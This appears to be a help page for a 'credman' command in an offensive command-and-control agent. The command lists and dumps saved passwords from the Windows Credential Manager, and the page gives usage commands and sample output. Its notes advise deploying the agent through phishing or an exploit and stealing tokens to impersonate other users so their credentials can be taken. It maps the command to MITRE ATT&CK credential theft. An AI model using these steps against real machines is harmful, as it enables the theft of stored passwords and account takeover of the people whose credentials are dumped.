+++
title = "credman"
chapter = false
weight = 108
hidden = false
+++

{{% notice info %}}Windows Only{{% /notice %}}

## Summary

Enumerate Windows Credential Manager entries (saved passwords, domain credentials, generic credentials). Uses the `CredEnumerateW` Win32 API — no subprocess creation, pure API call.

### Arguments

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| action | choose_one | No | list | `list`: show targets and usernames. `dump`: also reveal stored passwords. |
| filter | string | No | (all) | Optional target name filter using wildcards (e.g., `Microsoft*`, `*domain*`). |

## Usage

### List all credentials (metadata only)
```
credman
```
or
```
credman -action list
```

### Dump credentials with passwords
```
credman -action dump
```

### Filter by target name
```
credman -action dump -filter "Microsoft*"
```

### Example Output (list)
```
=== Windows Credential Manager (3 entries) ===

--- MicrosoftAccount:target=SSO_PRT_v5 ---
  Type:     Generic
  Username: user@outlook.com
  Blob:     128 bytes (use -action dump to reveal)
  Persist:  Local Machine

--- WindowsLive:target=virtualapp/didlogical ---
  Type:     Generic
  Username: WINUSER
  Blob:     44 bytes (use -action dump to reveal)
  Persist:  Local Machine

--- Domain:interactive=WORKGROUP\setup ---
  Type:     Domain Password
  Username: setup
  Persist:  Enterprise

Summary: 2 generic, 1 domain credentials
```

### Example Output (dump)
Same as above but includes `Password:` field with decrypted credential blobs.

## Notes

- **Requires interactive logon session**: The Credential Manager vault is tied to the user's interactive logon. If the agent runs via SSH or as a non-interactive service, enumeration will fail. Deploy via methods that create an interactive session (phishing, exploit, GUI session).
- **User context**: Returns credentials for the current user only. To access another user's credentials, impersonate them first (make-token/steal-token).
- Credential blobs are typically UTF-16 encoded passwords. Binary blobs are reported as `[binary data, N bytes]`.

## MITRE ATT&CK Mapping

- T1555.004 — Credentials from Password Stores: Windows Credential Manager
